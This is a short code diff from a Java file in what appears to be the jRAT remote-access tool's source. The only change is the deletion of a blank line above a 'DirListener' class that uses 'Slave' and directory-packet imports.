@@ -8,7 +8,6 @@ import javax.swing.JMenuItem;
 import pro.jrat.Slave;
 import pro.jrat.packets.outgoing.Packet41SpecialDirectory;
 
-
 public class DirListener implements ActionListener {
 
 	private Slave sl;
